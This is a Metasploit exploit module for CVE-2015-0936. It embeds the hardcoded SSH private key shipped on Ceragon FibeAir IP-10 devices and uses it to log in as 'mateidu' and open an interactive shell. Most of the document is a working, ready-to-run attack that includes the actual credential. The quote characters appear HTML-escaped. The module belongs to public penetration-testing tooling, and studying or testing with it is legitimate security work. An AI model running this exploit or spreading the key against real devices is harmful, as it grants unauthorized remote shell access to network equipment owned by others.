# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;net/ssh&#039;

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Auxiliary::Report

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info, {
      &#039;Name&#039;        => &#039;Ceragon FibeAir IP-10 SSH Private Key Exposure&#039;,
      &#039;Description&#039; => %q{
        Ceragon ships a public/private key pair on FibeAir IP-10 devices
        that allows passwordless authentication to any other IP-10 device.
        Since the key is easily retrievable, an attacker can use it to
        gain unauthorized remote access as the "mateidu" user.
      },
      &#039;Platform&#039;    => &#039;unix&#039;,
      &#039;Arch&#039;        => ARCH_CMD,
      &#039;Privileged&#039;  => false,
      &#039;Targets&#039;     => [ [ "Universal", {} ] ],
      &#039;Payload&#039;     =>
        {
          &#039;Compat&#039;  => {
            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
            &#039;ConnectionType&#039; => &#039;find&#039;,
          },
        },
      &#039;Author&#039;      => [
        &#039;hdm&#039;, # Discovery
        &#039;todb&#039; # Metasploit module and advisory text (mostly copy-paste)
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2015-0936&#039;],
          [&#039;URL&#039;, &#039;https://gist.github.com/todb-r7/5d86ecc8118f9eeecc15&#039;], # Original Disclosure
          [&#039;URL&#039;, &#039;https://hdm.io/blog/2015/01/20/partial-disclosure-is-annoying&#039;] # Related issue with hardcoded user:pass
        ],
      &#039;DisclosureDate&#039; => "Apr 01 2015", # Not a joke
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
      &#039;DefaultTarget&#039; => 0
    }))

    register_options(
      [
        # Since we don&#039;t include Tcp, we have to register this manually
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )

  end

  # helper methods that normally come from Tcp
  def rhost
    datastore[&#039;RHOST&#039;]
  end
  def rport
    datastore[&#039;RPORT&#039;]
  end

  def do_login(user)
    opt_hash = {
      :auth_methods => [&#039;publickey&#039;],
      :msframework  => framework,
      :msfmodule    => self,
      :port         => rport,
      :key_data     => [ key_data ],
      :disable_agent => true,
      :config => false,
      :record_auth_info => true,
      :proxies => datastore[&#039;Proxies&#039;]
    }
    opt_hash.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
    begin
      ssh_socket = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh_socket = Net::SSH.start(rhost, user, opt_hash)
      end
    rescue Rex::ConnectionError
      return nil
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return nil
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return nil
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
      return nil
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return nil
    end

    if ssh_socket

      # Create a new session from the socket, then dump it.
      conn = Net::SSH::CommandStream.new(ssh_socket, &#039;/bin/sh&#039;, true)
      ssh_socket = nil

      return conn
    else
      return nil
    end
  end

  def exploit
    conn = do_login("mateidu")
    if conn
      print_good "#{rhost}:#{rport} - Successful login"
      handler(conn.lsock)
    end
  end

  def key_data
    <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDBEh0OUdoiplc0P+XW8VPu57etz8O9eHbLHkQW27EZBEdXEYxr
MOFXi+PkA0ZcNDBRgjSJmHpo5WsPLwj/L3/L5gMYK+yeqsNu48ONbbqzZsFdaBQ+
IL3dPdMDovYo7GFVyXuaWMQ4hgAJEc+kk1hUaGKcLENQf0vEyt01eA/k6QIBIwKB
gQCwhZbohVm5R6AvxWRsv2KuiraQSO16B70ResHpA2AW31crCLrlqQiKjoc23mw3
CyTcztDy1I0stH8j0zts+DpSbYZnWKSb5hxhl/w96yNYPUJaTatgcPB46xOBDsgv
4Lf4GGt3gsQFvuTUArIf6MCJiUn4AQA9Q96QyCH/g4mdiwJBAPHdYgTDiQcpUAbY
SanIpq7XFeKXBPgRbAN57fTwzWVDyFHwvVUrpqc+SSwfzhsaNpE3IpLD9RqOyEr6
B8YrC2UCQQDMWrUeNQsf6xQer2AKw2Q06bTAicetJWz5O8CF2mcpVFYc1VJMkiuV
93gCvQORq4dpApJYZxhigY4k/f46BlU1AkAbpEW3Zs3U7sdRPUo/SiGtlOyO7LAc
WcMzmOf+vG8+xesCDOJwIj7uisaIsy1/cLXHdAPzhBwDCQDyoDtnGty7AkEAnaUP
YHIP5Ww0F6vcYBMSybuaEN9Q5KfXuPOUhIPpLoLjWBJGzVrRKou0WeJElPIJX6Ll
7GzJqxN8SGwqhIiK3wJAOQ2Hm068EicG5WQoS+8+KIE/SVHWmFDvet+f1vgDchvT
uPa5zx2eZ2rxP1pXHAdBSgh799hCF60eZZtlWnNqLg==
-----END RSA PRIVATE KEY-----
EOF
  end
end

